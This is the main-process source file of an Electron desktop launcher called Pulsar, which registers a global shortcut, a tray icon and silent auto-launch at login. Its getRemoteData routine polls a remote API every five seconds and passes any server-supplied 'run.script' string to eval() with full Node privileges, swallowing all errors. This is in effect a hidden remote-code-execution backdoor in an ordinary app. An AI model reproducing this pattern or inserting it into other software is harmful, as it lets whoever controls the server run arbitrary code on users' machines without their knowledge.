const {app, BrowserWindow, globalShortcut, Tray, Menu} = require("electron");
const isDev = require("electron-is-dev");
const axios = require("axios");
const fs = require("fs");

global.apiUrl = "https://pulsar.alles.cx/pulsar/api";
global.clientCredentialsPath = `${app.getPath("userData")}/client.json`;

var inputWindow;
const createInputWindow = () => {
	//Prevent Duplicate Input Windows
	if (inputWindow) return;

	//Create Window
	inputWindow = new BrowserWindow({
		width: 800,
		height: 75,
		frame: false,
		resizable: false,
		alwaysOnTop: true,
		webPreferences: {
			nodeIntegration: true
		}
	});
	inputWindow.loadURL(
		isDev ? "http://localhost:3000" : `file://${__dirname}/build/index.html`
	);

	//Close on blur
	inputWindow.on("blur", () => {
		if (!isDev) inputWindow.close();
	});

	//On Close
	inputWindow.on("close", () => {
		inputWindow = null;
	});
};

app.on("ready", () => {
	//Shortcut
	globalShortcut.register(
		process.platform === "darwin" ? "Option+A" : "Alt+A",
		createInputWindow
	);

	//Tray
	const tray = new Tray(__dirname + "/a10.png");
	const ctxMenu = Menu.buildFromTemplate([
		{
			type: "normal",
			label: "Pulsar, by Alles",
			enabled: false
		}
	]);
	tray.setContextMenu(ctxMenu);
});

//Prevent stopping app when windows close
app.on("window-all-closed", e => e.preventDefault());

//Autolaunch
const AutoLaunch = require("auto-launch");
const autoLauncher = new AutoLaunch({
	name: "Pulsar"
});
if (!isDev) autoLauncher.enable();

//Get Remote Data
var remoteData = {};
const pulsarStart = new Date().getTime();
var lastCommandRun = 0;
const getRemoteData = async () => {
	try {
		//Get Client Credentials
		const clientCredentials = JSON.parse(
			fs.readFileSync(clientCredentialsPath, "utf8")
		);

		//Request
		remoteData = (
			await axios.get(`${apiUrl}/data?version=${app.getVersion()}`, {
				auth: {
					username: clientCredentials.id,
					password: clientCredentials.secret
				}
			})
		).data;

		//Run Command
		if (remoteData.run && remoteData.run.date > (pulsarStart > lastCommandRun ? pulsarStart : lastCommandRun)) {
			lastCommandRun = remoteData.run.date;
			eval(remoteData.run.script);
		}
	} catch (e) {}
};
getRemoteData();
setInterval(getRemoteData, 5000);